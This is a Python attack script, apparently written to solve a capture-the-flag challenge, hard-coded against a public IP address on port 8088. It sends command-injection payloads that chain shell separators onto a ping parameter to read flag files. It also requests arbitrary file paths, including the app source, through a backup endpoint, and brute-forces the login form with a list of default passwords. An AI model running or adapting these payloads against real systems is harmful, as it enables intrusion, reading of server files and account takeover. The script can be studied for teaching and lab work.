import requests
import re
import time
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
os.environ.pop('http_proxy', None)
os.environ.pop('https_proxy', None)

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
})
session.proxies = {}


def wait_for_port():
    """等待端口开放"""
    print("等待8088端口开放...")
    
    for i in range(30):
        try:
            r = session.get(TARGET, timeout=3)
            if r.status_code == 200:
                print(f"\n端口已开放！开始寻找flag...")
                return True
        except:
            pass
        
        print(f"尝试 {i+1}/30...", end=" ")
        time.sleep(2)
    
    return False


def find_flag():
    """寻找flag"""
    
    # 1. 测试主页面
    print("\n" + "="*60)
    print("1. 测试主页面")
    print("="*60)
    
    r = session.get(TARGET, timeout=TIMEOUT)
    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    if flag_match:
        print(f"🚩 FLAG FOUND: {flag_match.group(0)}")
        return flag_match.group(0)
    
    # 2. 测试Ping命令执行
    print("\n" + "="*60)
    print("2. 测试Ping命令执行")
    print("="*60)
    
    ping_payloads = [
        "127.0.0.1 & type F:\\flag.txt",
        "127.0.0.1 && type F:\\flag.txt",
        "127.0.0.1 | type F:\\flag.txt",
        "127.0.0.1; type F:\\flag.txt",
        "127.0.0.1 & type F:\\small peoject\\python-lab\\flag.txt",
        "127.0.0.1 && type F:\\small peoject\\python-lab\\flag.txt",
        "127.0.0.1 | type F:\\small peoject\\python-lab\\flag.txt",
        "127.0.0.1; type F:\\small peoject\\python-lab\\flag.txt",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(f"{TARGET}/ping", params={"host": payload}, timeout=TIMEOUT)
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    content = body_match.group(1)
                    if len(content) > 50 and "Blocked" not in content:
                        print(f"[{payload}]: {content[:300]}")
                        flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                        if flag_match:
                            print(f"🚩 FLAG FOUND: {flag_match.group(0)}")
                            return flag_match.group(0)
        except:
            pass
    
    # 3. 测试Backup命令执行
    print("\n" + "="*60)
    print("3. 测试Backup命令执行")
    print("="*60)
    
    backup_payloads = [
        "F:\\flag.txt",
        "F:\\small peoject\\python-lab\\flag.txt",
        "F:\\small peoject\\python-lab\\app.py",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(f"{TARGET}/backup", params={"path": payload}, timeout=TIMEOUT)
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    content = body_match.group(1)
                    if len(content) > 20 and "Blocked" not in content:
                        print(f"[{payload}]: {content[:300]}")
                        flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                        if flag_match:
                            print(f"🚩 FLAG FOUND: {flag_match.group(0)}")
                            return flag_match.group(0)
        except:
            pass
    
    # 4. 测试搜索功能
    print("\n" + "="*60)
    print("4. 测试搜索功能")
    print("="*60)
    
    search_payloads = ["flag", "FLAG", "secret", "%"]
    
    for payload in search_payloads:
        try:
            r = session.get(f"{TARGET}/search", params={"q": payload}, timeout=TIMEOUT)
            if r.status_code == 200:
                flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                if flag_match:
                    print(f"🚩 FLAG FOUND: {flag_match.group(0)}")
                    return flag_match.group(0)
        except:
            pass
    
    # 5. 测试登录
    print("\n" + "="*60)
    print("5. 测试登录")
    print("="*60)
    
    r = session.get(f"{TARGET}/login", timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    credentials = [
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "ctf"),
        ("admin", "term3lab"),
        ("admin", "flag"),
        ("admin", "python"),
        ("admin", "lab"),
    ]
    
    for username, password in credentials:
        try:
            data = {"username": username, "password": password, "csrf": csrf_token}
            r = session.post(f"{TARGET}/login", data=data, timeout=TIMEOUT)
            if r.status_code == 200 and "用户名或密码错误" not in r.text:
                print(f"登录成功: {username}/{password}")
                print(f"内容: {r.text[:500]}")
                flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                if flag_match:
                    print(f"🚩 FLAG FOUND: {flag_match.group(0)}")
                    return flag_match.group(0)
                
                # 检查控制台
                r2 = session.get(f"{TARGET}/dashboard", timeout=TIMEOUT)
                flag_match2 = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                if flag_match2:
                    print(f"🚩 FLAG FOUND: {flag_match2.group(0)}")
                    return flag_match2.group(0)
        except:
            pass
    
    print("\n未找到flag")
    return None


def main():
    print("="*60)
    print("FLAG寻找脚本")
    print("目标: " + TARGET)
    print("="*60)
    
    if wait_for_port():
        flag = find_flag()
        if flag:
            print("\n" + "="*60)
            print(f"🎉 成功获取FLAG: {flag}")
            print("="*60)
        else:
            print("\n未能找到FLAG，请检查服务是否正常运行")


if __name__ == "__main__":
    main()